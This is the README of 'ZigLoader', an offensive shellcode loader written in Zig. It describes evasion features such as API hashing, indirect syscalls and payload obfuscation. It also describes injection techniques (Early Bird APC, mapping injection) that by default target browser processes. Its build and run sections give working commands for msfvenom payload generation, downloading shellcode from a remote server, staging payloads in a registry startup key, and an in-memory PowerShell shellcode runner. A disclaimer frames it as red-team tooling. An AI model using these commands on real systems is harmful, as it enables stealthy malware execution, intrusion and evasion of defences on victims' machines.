# ZigLoader

A shellcode loader written in Zig.  
The loader injects the shellcode into a target process and executes it.

## Features

- Dynamic API resolution using hashing
- Indirect syscalls
- Shellcode obfuscation
- Flexible loading methods (embedded, download, registry)
- Various injection techniques
- sRDI support (build the loader itself as shellcode)

### Loading Methods

ZigLoader can load shellcode in the following ways:

- Embed in ZigLoader
- Download via HTTP
- Read from the Registry
- Read from the Environment Variable

### Injection Methods

- Classic (NtAllocateVirtualMemory + NtCreateThreadEx)
- Early Bird APC Injection
- Callback Execution
- Local Mapping Injection
- Remote Mapping Injection

## Build

You will need at least `zig v0.15.0+` to build ZigLoader. 

### Use Case 1. Embedded Shellcode Loader

This is the simplest usage mode.  
Specify a shellcode binary via a build option to embed and obfuscate it during the build.  
For example, generate shellcode with MsfVenom:

```sh
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
zig build -Dpayload=./shellcode.bin
```

After building, EXE, DLL, and shellcode files will be generated into the `zig-out/bin` directory.  
The embedded shellcode is automatically decrypted at runtime and injected into a target process.

### Use Case 2. Remote Shellcode Loader

To enable runtime downloading, specify the URL with the `-Dpayload_url` option.  
At runtime, the loader fetches the shellcode via **HTTP(S)**, deobfuscates it, and injects it into memory.

```sh
zig build -Dpayload=./shellcode.bin -Dpayload_url=https://your-server.com/obfuscated-shellcode.bin
```

This build will output an obfuscated version of the `shellcode.bin` in the `zig-out/payload` folder.  
You must host this file at the specified URL so the loader can retrieve it at runtime.  

Additionally, you can specify the following options:

- `-Dmethod=POST`
- `-Dheaders="Content-Type: application/json\r\nX-SECRET: mysecret666\r\n"`
- `-Ddata="{\"secret\":\"mysecret666\"}"`

### Use Case 3. Registry Shellcode Loader

Loads and executes the shellcode byte data stored in the registry in advance.  

First, build ZigLoader using the following command. If you specify `-Dpayload_reg_key` and `-Dpayload_reg_value`, the loader will be built in a mode that loads the payload from the specified path and value.

```sh
zig build -Dpayload=./shellcode.bin -Dpayload_reg_key="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run" -Dpayload_reg_value="MyPayload"
```

After building, the `obfuscated-shellcode.bin` file will be created in the `zig-out/payload` folder. This is an obfuscated version of the payload specified with the `-Dpayload` option during build.  
This obfuscated payload binary must already be stored in the target system's registry, so run the following command:

```powershell
# 1. Convert payload to Hex
xxd -p obfuscated-shellcode.bin | tr -d '\n'

# 2. In target machine, store the hex value to the specified registry key and value
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "MyPayload" /t REG_BINARY /d <HEX_VALUE> /f
```

This allows the payload to be loaded and executed from that registry key when ZigLoader is run on the target machine.  

### Use Case 4. Environment Variable Shellcode Loader

Obtains the Base64-encoded shellcode that has been set in the environment variable in advance, decrypts it, and executes it.

```sh
zig build -Dpayload=./shellcode.bin -Dpayload_env=AppMetadata
```

### (Optional) Priority of Injection Methods

ZigLoader provides fail-safe attack attempts.  
Injection methods are attempted until successful, with the following priority by default:

1. Remote Mapping Injection
2. Local Mapping Injection
3. Callback Shellcode Execution
4. Early Bird APC Injection
5. Classic Injection (NtAllocateVirtualMemory + NtCreateThreadEx)

You can specify the `-Dinjection` option to change this setting. For example,

- `-Dinjection=classic` => Only executes Classic Injection
- `-Dinjection=earlybird,callback` => Only executes Early Bird and Callback
- `-Dinjection=remote_mapping,local_mapping` => Only executes Mapping Injections

### (Optional) Targeting Specific Processes

You can optionally specify target process names using the `-Dprocess` build option.
This accepts a comma-separated, case-insensitive list of process names:

```sh
zig build -Dpayload=./shellcode.bin -Dprocess=chrome.exe,notepad.exe
```

If this option is omitted, the following default process names will be used:
`chrome.exe,msedge.exe,firefox.exe,brave.exe,notepad.exe,conhost.exe`  

The behavior of this option depends on the selected injection technique (via `-Dinjection`):

- `classic`  
    Attempts to inject shellcode into a running instance of one of the specified processes.

- `earlybird`  
    Creates a new suspended process from the specified image, injects the shellcode, and resumes it via APC.  
    If multiple process names are specified, only the first one is used.

## Output Files

After building, the following files will be generated in the `zig-out/bin` directory:

- EXE: `x86.exe`, `x64.exe`, `aarch64.exe`
- DLL: `x86.dll`, `x64.dll`, `aarch64.dll`
- Shellcode: `x86.bin`, `x64.bin`, `aarch64.bin`

## Execution Examples

### 1. As Shellcode

The shellcode is built using **sRDI** from the DLL version.  
You can inject it into memory via **PowerShell** as follows (after **Base64-encoding** it with `base64 x64.bin -w 0`):

```powershell
$sc = [Convert]::FromBase64String("<BASE64_ENCODED_SHELLCODE>")
$size = $sc.Length
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $ptr, $size)
$oldProtect = 0
$VirtualProtect = (Add-Type -MemberDefinition @"
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Win32" -Namespace "Win32Functions" -PassThru)
$uptr = [UIntPtr]::op_Explicit($size)
$null = $VirtualProtect::VirtualProtect($ptr, $uptr, 0x40, [ref]$oldProtect)
$del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [type]::GetType("System.Action"))
$del.Invoke()
```

### 2. As DLL

Note: This is not a reflective DLL, so usage may be limited depending on the context.  
For example, you can execute it using `rundll32.exe`. The export function is named **"run"**.

```powershell
rundll32.exe C:\x64.dll,run
```

### 3. As EXE

The EXE file can be run directly:

```powershell
.\x64.exe
```

## Disclaimer

It is designed for red team exercises and malware analysis. Not for illegal use.
